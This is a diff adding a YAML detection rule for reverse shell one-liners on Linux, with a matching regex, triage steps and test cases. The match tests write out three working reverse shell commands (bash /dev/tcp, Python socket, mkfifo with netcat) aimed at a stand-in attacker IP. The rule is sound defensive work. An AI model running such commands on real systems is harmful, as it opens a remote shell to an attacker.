@@ -1,0 +1,36 @@
+id: DL-0064
+title: Reverse shell one-liner on Linux
+description: >
+  Command lines that connect a shell back to an attacker: bash with /dev/tcp, bash -i,
+  netcat or ncat with -e or -c, mkfifo pipes, socat exec, or Python and Perl socket
+  one-liners. After a web exploit this is usually the first thing run.
+attack: [T1059.004, T1059.006]
+tactic: execution
+severity: critical
+logsource: process_creation
+detection:
+  reverse_shell:
+    process.command_line|re: '(/dev/(tcp|udp)/|\bbash\s+-i\b|\bnc(at)?\b.*\s-(e|c)\s|mkfifo\s|socat\b.*exec:|socket\.socket\(|pty\.spawn\(|IO::Socket::INET)'
+  condition: reverse_shell
+false_positives:
+  - Admin scripts that test a port with bash /dev/tcp. They do not start an interactive shell.
+triage:
+  - Isolate the host. Take the remote IP and port from the command line and block them at the edge.
+  - Find the parent. A web server or PHP worker parent means a web exploit (DL-0063); check the web logs around that time.
+tests:
+  match:
+    - process.name: bash
+      process.path: /usr/bin/bash
+      process.command_line: 'bash -c "bash -i >& /dev/tcp/203.0.113.9/443 0>&1"'
+    - process.name: python3
+      process.path: /usr/bin/python3
+      process.command_line: 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((''203.0.113.9'',443))"'
+    - process.name: sh
+      process.path: /bin/sh
+      process.command_line: 'sh -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 203.0.113.9 443 >/tmp/f"'
+  no_match:
+    - process.name: bash
+      process.path: /usr/bin/bash
+      process.command_line: 'bash /opt/backup/run.sh --daily'
+references:
+  - https://attack.mitre.org/techniques/T1059/004/
